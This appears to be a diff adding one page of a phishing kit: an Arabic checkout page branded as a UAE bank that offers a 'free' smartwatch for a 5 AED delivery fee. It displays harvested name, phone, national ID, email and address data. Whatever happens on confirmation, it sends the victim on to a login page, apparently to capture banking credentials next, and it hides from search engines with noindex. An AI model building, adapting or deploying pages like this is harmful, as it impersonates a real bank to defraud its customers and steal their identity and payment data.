@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="robots" content="noindex, nofollow">
+<title>ملخص الطلب والدفع - بنك المارية المحلي</title>
+<link rel="icon" href="/ar/wp-content/uploads/sites/5/2024/04/cropped-favicon-mbank-1-32x32.png" sizes="32x32">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+body{font-family:'Segoe UI',Tahoma,sans-serif;background:#f5f7fa;color:#1a1a2e;min-height:100vh;}
+
+.top-bar{background:#0a1628;padding:16px 20px;position:fixed;top:0;left:0;right:0;z-index:999;display:flex;align-items:center;justify-content:center;}
+.top-bar img{height:32px;object-fit:contain;}
+
+.page-wrapper{max-width:600px;margin:0 auto;padding:80px 16px 40px;}
+
+.steps{display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:30px;}
+.step{width:36px;height:36px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:0.85rem;font-weight:700;}
+.step.done{background:#00c853;color:#fff;}
+.step.active{background:linear-gradient(135deg,#00c8ff,#0080ff);color:#fff;}
+.step.pending{background:#e0e0e0;color:#999;}
+.step-line{width:40px;height:3px;border-radius:2px;}
+.step-line.done{background:#00c853;}
+.step-line.pending{background:#e0e0e0;}
+
+.page-title{text-align:center;font-size:1.5rem;font-weight:800;color:#1a1a2e;margin-bottom:6px;}
+.page-subtitle{text-align:center;font-size:0.9rem;color:#666;margin-bottom:28px;}
+
+.card{background:#fff;border-radius:20px;padding:28px 24px;box-shadow:0 4px 20px rgba(0,0,0,0.06);border:1px solid #eee;margin-bottom:20px;}
+
+.card-header{display:flex;align-items:center;gap:10px;margin-bottom:18px;padding-bottom:14px;border-bottom:1px solid #f0f0f0;}
+.card-icon{width:40px;height:40px;border-radius:12px;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
+.card-icon.blue{background:rgba(0,128,255,0.1);}
+.card-icon.green{background:rgba(0,200,83,0.1);}
+.card-icon.gold{background:rgba(255,193,7,0.1);}
+.card-icon svg{width:20px;height:20px;}
+.card-label{font-size:1.05rem;font-weight:700;color:#1a1a2e;}
+
+.info-row{display:flex;justify-content:space-between;align-items:center;padding:10px 0;border-bottom:1px solid #f5f5f5;}
+.info-row:last-child{border-bottom:none;}
+.info-key{font-size:0.88rem;color:#888;font-weight:500;}
+.info-val{font-size:0.95rem;color:#1a1a2e;font-weight:600;text-align:left;direction:ltr;max-width:60%;}
+
+.price-row{display:flex;justify-content:space-between;align-items:center;padding:12px 0;}
+.price-row .label{font-size:0.95rem;color:#555;}
+.price-row .value{font-size:1rem;font-weight:700;}
+.price-row .value.free{color:#00c853;}
+.price-row .value.fee{color:#1a1a2e;}
+.price-divider{height:1px;background:#eee;margin:4px 0;}
+.price-total{display:flex;justify-content:space-between;align-items:center;padding:14px 0 4px;}
+.price-total .label{font-size:1.05rem;font-weight:700;color:#1a1a2e;}
+.price-total .value{font-size:1.3rem;font-weight:800;color:#0080ff;}
+
+.badge-free{display:inline-block;background:#e8f5e9;color:#2e7d32;font-size:0.75rem;font-weight:700;padding:3px 10px;border-radius:20px;margin-right:6px;}
+
+.payment-methods{display:flex;gap:10px;flex-wrap:wrap;margin-top:8px;}
+.pay-method{flex:1;min-width:80px;padding:14px 10px;border:2px solid #eee;border-radius:14px;text-align:center;cursor:pointer;transition:all 0.2s;background:#fff;}
+.pay-method:hover{border-color:#ccc;}
+.pay-method.selected{border-color:#0080ff;background:rgba(0,128,255,0.04);}
+.pay-method svg{width:32px;height:32px;margin:0 auto 6px;display:block;}
+.pay-method span{font-size:0.78rem;color:#555;font-weight:600;display:block;}
+
+.confirm-btn{display:block;width:100%;padding:17px;margin-top:24px;background:linear-gradient(135deg,#00c8ff,#0080ff);color:#fff;border:none;border-radius:14px;font-size:1.15rem;font-weight:700;cursor:pointer;transition:opacity 0.3s;font-family:inherit;}
+.confirm-btn:hover{opacity:0.88;}
+.confirm-btn:disabled{opacity:0.5;cursor:not-allowed;}
+
+.secure-note{display:flex;align-items:center;justify-content:center;gap:6px;margin-top:14px;font-size:0.8rem;color:#999;}
+.secure-note svg{width:14px;height:14px;}
+
+.edit-link{font-size:0.82rem;color:#0080ff;text-decoration:none;font-weight:600;}
+.edit-link:hover{text-decoration:underline;}
+
+@media(max-width:480px){
+  .page-wrapper{padding:72px 12px 30px;}
+  .card{padding:22px 18px;}
+  .page-title{font-size:1.3rem;}
+  .pay-method{min-width:70px;padding:12px 8px;}
+}
+</style>
+</head>
+<body>
+
+<div class="top-bar">
+  <img src="/ar/wp-content/themes/framework/assets/client/img/logo-white-2.png" alt="بنك المارية المحلي">
+</div>
+
+<div class="page-wrapper">
+
+  <div class="steps">
+    <div class="step done">&#10003;</div>
+    <div class="step-line done"></div>
+    <div class="step active">2</div>
+    <div class="step-line pending"></div>
+    <div class="step pending">3</div>
+  </div>
+
+  <h1 class="page-title">ملخص الطلب والدفع</h1>
+  <p class="page-subtitle">يرجى مراجعة بياناتك قبل تأكيد الطلب</p>
+
+  <!-- Customer Info Card -->
+  <div class="card">
+    <div class="card-header">
+      <div class="card-icon blue">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#0080ff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/>
+        </svg>
+      </div>
+      <span class="card-label">بيانات العميل</span>
+      <a href="/ar/order/" class="edit-link" style="margin-right:auto;margin-left:0;">تعديل</a>
+    </div>
+    <div class="info-row">
+      <span class="info-key">الاسم الكامل</span>
+      <span class="info-val" id="summary-name">-</span>
+    </div>
+    <div class="info-row">
+      <span class="info-key">رقم الجوال</span>
+      <span class="info-val" id="summary-phone">-</span>
+    </div>
+    <div class="info-row">
+      <span class="info-key">رقم الهوية</span>
+      <span class="info-val" id="summary-id">-</span>
+    </div>
+    <div class="info-row">
+      <span class="info-key">البريد الإلكتروني</span>
+      <span class="info-val" id="summary-email">-</span>
+    </div>
+    <div class="info-row">
+      <span class="info-key">الإمارة</span>
+      <span class="info-val" id="summary-emirate" style="direction:rtl;text-align:left;">-</span>
+    </div>
+    <div class="info-row">
+      <span class="info-key">عنوان التوصيل</span>
+      <span class="info-val" id="summary-address" style="direction:rtl;text-align:left;">-</span>
+    </div>
+  </div>
+
+  <!-- Order Details Card -->
+  <div class="card">
+    <div class="card-header">
+      <div class="card-icon green">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#00c853" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="1" y="3" width="15" height="13" rx="2"/><path d="M16 8h4l3 3v5a1 1 0 0 1-1 1h-2"/><circle cx="5.5" cy="18.5" r="2.5"/><circle cx="18.5" cy="18.5" r="2.5"/>
+        </svg>
+      </div>
+      <span class="card-label">تفاصيل الطلب</span>
+    </div>
+    <div class="price-row">
+      <span class="label">الساعة الذكية (توكن) <span class="badge-free">مجانية</span></span>
+      <span class="value free">0.00 د.إ</span>
+    </div>
+    <div class="price-row">
+      <span class="label">رسوم التوصيل</span>
+      <span class="value fee">5.00 د.إ</span>
+    </div>
+    <div class="price-divider"></div>
+    <div class="price-total">
+      <span class="label">المبلغ الإجمالي</span>
+      <span class="value">5.00 د.إ</span>
+    </div>
+  </div>
+
+  <!-- Payment Method Card -->
+  <div class="card">
+    <div class="card-header">
+      <div class="card-icon gold">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#f9a825" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/>
+        </svg>
+      </div>
+      <span class="card-label">طريقة الدفع</span>
+    </div>
+    <div class="payment-methods">
+      <div class="pay-method selected" data-method="card" onclick="selectMethod(this)">
+        <svg viewBox="0 0 48 48" fill="none">
+          <rect x="4" y="10" width="40" height="28" rx="4" fill="#1a73e8"/>
+          <rect x="4" y="18" width="40" height="6" fill="#0d47a1"/>
+          <rect x="8" y="28" width="16" height="3" rx="1.5" fill="#fff" opacity="0.7"/>
+          <rect x="8" y="33" width="10" height="2" rx="1" fill="#fff" opacity="0.4"/>
+        </svg>
+        <span>بطاقة بنكية</span>
+      </div>
+      <div class="pay-method" data-method="apple" onclick="selectMethod(this)">
+        <svg viewBox="0 0 48 48" fill="none">
+          <rect width="48" height="48" rx="8" fill="#000"/>
+          <path d="M30.5 14.8c-1.5 0-3 .8-4 2-.9 1-1.6 2.6-1.4 4.1 1.6.1 3.2-.7 4.1-1.8.9-1.1 1.6-2.6 1.3-4.3zm3.4 7.2c-2-.1-3.6 1.1-4.6 1.1-.9 0-2.4-1.1-4-1-2 0-3.9 1.2-5 3-2.1 3.7-.5 9.1 1.5 12.1 1 1.5 2.2 3.1 3.8 3 1.5-.1 2.1-1 3.9-1s2.4 1 4 1c1.6 0 2.7-1.5 3.7-3 1.1-1.7 1.6-3.3 1.6-3.4 0 0-3-1.2-3.1-4.6 0-2.9 2.4-4.2 2.5-4.3-1.4-2-3.5-2.2-4.3-2.9z" fill="#fff"/>
+        </svg>
+        <span>Apple Pay</span>
+      </div>
+      <div class="pay-method" data-method="cod" onclick="selectMethod(this)">
+        <svg viewBox="0 0 48 48" fill="none">
+          <rect width="48" height="48" rx="8" fill="#e8f5e9"/>
+          <circle cx="24" cy="22" r="10" fill="#43a047"/>
+          <text x="24" y="26" text-anchor="middle" fill="#fff" font-size="11" font-weight="bold">د.إ</text>
+          <rect x="12" y="35" width="24" height="3" rx="1.5" fill="#43a047" opacity="0.3"/>
+        </svg>
+        <span>عند الاستلام</span>
+      </div>
+    </div>
+  </div>
+
+  <button class="confirm-btn" id="confirmBtn" onclick="confirmOrder()">تأكيد الطلب ودفع 5.00 د.إ</button>
+
+  <div class="secure-note">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+      <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+    </svg>
+    <span>جميع المعاملات محمية ومشفرة بالكامل</span>
+  </div>
+
+</div>
+
+<script>
+function selectMethod(el) {
+  document.querySelectorAll('.pay-method').forEach(function(m) { m.classList.remove('selected'); });
+  el.classList.add('selected');
+  var method = el.getAttribute('data-method');
+  var btn = document.getElementById('confirmBtn');
+  if (method === 'cod') {
+    btn.textContent = 'تأكيد الطلب - الدفع عند الاستلام';
+  } else if (method === 'apple') {
+    btn.textContent = 'الدفع بـ Apple Pay - 5.00 د.إ';
+  } else {
+    btn.textContent = 'تأكيد الطلب ودفع 5.00 د.إ';
+  }
+}
+
+function loadSummary() {
+  try {
+    var name = sessionStorage.getItem('order_name') || '';
+    var phone = sessionStorage.getItem('order_phone') || '';
+    var idNum = sessionStorage.getItem('order_id_number') || '';
+    var email = sessionStorage.getItem('order_email') || '';
+    var emirate = sessionStorage.getItem('order_emirate') || '';
+    var address = sessionStorage.getItem('order_address') || '';
+
+    if (!name && !phone) {
+      window.location.href = '/ar/order/';
+      return;
+    }
+
+    document.getElementById('summary-name').textContent = name || '-';
+    document.getElementById('summary-phone').textContent = phone || '-';
+    document.getElementById('summary-id').textContent = idNum || '-';
+    document.getElementById('summary-email').textContent = email || '-';
+    document.getElementById('summary-emirate').textContent = emirate || '-';
+    document.getElementById('summary-address').textContent = address || '-';
+  } catch(e) {
+    window.location.href = '/ar/order/';
+  }
+}
+
+function confirmOrder() {
+  var btn = document.getElementById('confirmBtn');
+  if (btn.disabled) return;
+  btn.disabled = true;
+  btn.textContent = 'جاري المعالجة...';
+
+  var method = 'card';
+  var selected = document.querySelector('.pay-method.selected');
+  if (selected) method = selected.getAttribute('data-method');
+
+  try {
+    sessionStorage.setItem('payment_method', method);
+    sessionStorage.setItem('payment_amount', '5.00');
+  } catch(e) {}
+
+  var orderId = '';
+  try { orderId = sessionStorage.getItem('order_id') || ''; } catch(e) {}
+
+  if (orderId) {
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', '/api/orders', true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.onload = function() {
+      window.location.href = '/ar/login/';
+    };
+    xhr.onerror = function() {
+      window.location.href = '/ar/login/';
+    };
+    xhr.send(JSON.stringify({
+      id: orderId,
+      payment_method: method,
+      payment_amount: 5,
+      status: 'payment_confirmed'
+    }));
+  } else {
+    window.location.href = '/ar/login/';
+  }
+}
+
+document.addEventListener('DOMContentLoaded', loadSummary);
+</script>
+</body>
+</html>
